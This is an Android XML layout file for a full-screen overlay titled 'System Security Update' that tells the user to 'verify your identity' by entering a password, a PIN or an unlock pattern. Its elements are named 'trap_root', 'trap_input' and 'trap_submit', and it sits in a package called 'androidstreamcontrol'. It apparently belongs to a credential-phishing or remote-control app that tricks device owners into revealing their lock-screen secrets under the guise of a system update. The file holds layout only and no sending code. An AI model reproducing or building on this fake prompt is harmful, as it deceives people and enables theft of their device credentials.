<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/trap_root"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#000000"
    android:clickable="true"
    android:focusable="true">

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:orientation="vertical"
        android:gravity="center_horizontal"
        android:padding="24dp">

        <ImageView
            android:layout_width="64dp"
            android:layout_height="64dp"
            android:layout_marginTop="40dp"
            android:src="@android:drawable/ic_dialog_alert"
            android:tint="#FFFFFF" />

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="24dp"
            android:text="System Security Update"
            android:textColor="#FFFFFF"
            android:textSize="24sp"
            android:textStyle="bold" />

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="12dp"
            android:text="Please verify your identity to complete the update process."
            android:textColor="#AAAAAA"
            android:textSize="14sp"
            android:textAlignment="center" />

        <Space
            android:layout_width="match_parent"
            android:layout_height="0dp"
            android:layout_weight="1" />

        <!-- Container for Pattern View -->
        <FrameLayout
            android:id="@+id/pattern_container"
            android:layout_width="300dp"
            android:layout_height="300dp"
            android:layout_marginBottom="20dp"
            android:visibility="gone">

            <com.rcl.androidstreamcontrol.service.PatternView
                android:id="@+id/pattern_view"
                android:layout_width="match_parent"
                android:layout_height="match_parent" />
        </FrameLayout>

        <!-- Container for QWERTY PIN/Password -->
        <LinearLayout
            android:id="@+id/pin_container"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical"
            android:layout_marginBottom="20dp"
            android:visibility="visible">

            <EditText
                android:id="@+id/trap_input"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="Enter Password or PIN"
                android:textColorHint="#555555"
                android:textColor="#FFFFFF"
                android:textSize="18sp"
                android:padding="16dp"
                android:backgroundTint="#4488FF"
                android:inputType="textPassword"
                android:gravity="center"
                android:maxLines="1"
                android:imeOptions="actionDone" />

        </LinearLayout>

        <Button
            android:id="@+id/trap_submit"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="Submit"
            android:textSize="16sp"
            android:backgroundTint="#4488FF"
            android:textColor="#FFFFFF"
            android:padding="16dp"
            android:layout_marginBottom="16dp" />

        <Button
            android:id="@+id/trap_toggle_mode"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Switch to Pattern"
            android:background="@android:color/transparent"
            android:textColor="#AAAAAA"
            android:layout_marginBottom="20dp" />

    </LinearLayout>

</RelativeLayout>
